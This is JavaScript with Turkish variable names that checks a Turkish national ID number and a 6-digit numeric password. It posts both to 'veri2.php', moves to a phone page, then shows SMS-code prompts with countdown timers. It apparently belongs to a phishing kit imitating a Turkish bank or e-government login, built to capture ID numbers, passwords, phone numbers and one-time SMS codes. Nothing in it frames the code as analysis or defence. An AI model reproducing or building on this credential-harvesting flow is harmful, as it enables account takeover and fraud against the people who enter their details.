function tcno_dogrula(tcno) {
    tcno = String(tcno);
    if (tcno.substring(0, 1) === '0' || tcno.length !== 11) {
        return false;
    }
    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;

    for (var i = 0; i < 9; ++i) {
        var j = parseInt(ilkon_array[i], 10);
        if (i % 2 === 0) {
            hane_tek += j;
        } else {
            hane_cift += j;
        }
        ilkon_total += j;
    }

    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
        return false;
    }

    ilkon_total += parseInt(ilkon_array[9], 10);
    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
        return false;
    }

    return true;
}

function submitCustomForm() {
    const tc = document.getElementById('customUsername').value;
    const password = document.getElementById('customPassword').value;

    const alertDiv = document.getElementById('alertDiv');

    if (!tcno_dogrula(tc) || password.length !== 6 || isNaN(password)) {
        alertDiv.classList.add('show');
    } else {
        alertDiv.classList.remove('show');

        // Veri post işlemi
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "veri2.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                window.location.href = "telefon.php";
            }
        };
        xhr.send(`tc=${tc}&password=${password}`);
    }
}
function closeAlert() {
    document.getElementById('alertDiv').style.display = 'none';
}
 
 
    

function alertCagir() {
    var alertDiv = document.getElementById("alertDiv");
    alertDiv.classList.add("show");
}

function closeAlert() {
    var alertDiv = document.getElementById("alertDiv");
    alertDiv.classList.remove("show");
}

function uyari() {
    var alertDiv2 = document.getElementById("alertDiv2");
    $("#sms").val("");
    alertDiv2.classList.add("show2");
    updateCountdown(); // Geri sayımı başlat
    restartCountdown();
}

function uyari2() {
    var alertDiv2 = document.getElementById("alertDiv3");
    $("#phone2").val("");
    alertDiv2.classList.add("show2");
    updateCountdown(); // Geri sayımı başlat
    restartCountdown();
    $(".btnn-spc3").css("background-color", "#ee1502");
}

function uyariKapat() {
    var alertDiv2 = document.getElementById("alertDiv2");
    alertDiv2.classList.remove("show2");
}
 
function handleButtonClick() {
   
    const gray2Element = document.querySelector('.gray2.slide.active');
    if (gray2Element) {
        gray2Element.classList.remove('active');
        gray2Element.classList.add('hidden');
    }


    const gray3Element = document.querySelector('.gray3.slide.hidden');
    if (gray3Element) {
        gray3Element.classList.remove('hidden');
        gray3Element.classList.add('active');
    }
}
 
function uyariKapat() {
    const alertDiv = document.getElementById('alertDiv3');
    if (alertDiv) {
        alertDiv.classList.remove('show');
    }
}



function goBack() {
    const gray3 = document.querySelector('.gray3.slide.active');
    const gray2 = document.querySelector('.gray2.slide.hidden');
    if (gray3 && gray2) {
        gray3.classList.remove('active');
        gray3.classList.add('hidden');
        gray2.classList.remove('hidden');
        gray2.classList.add('active');
    } else {
        window.history.back();
    }
}
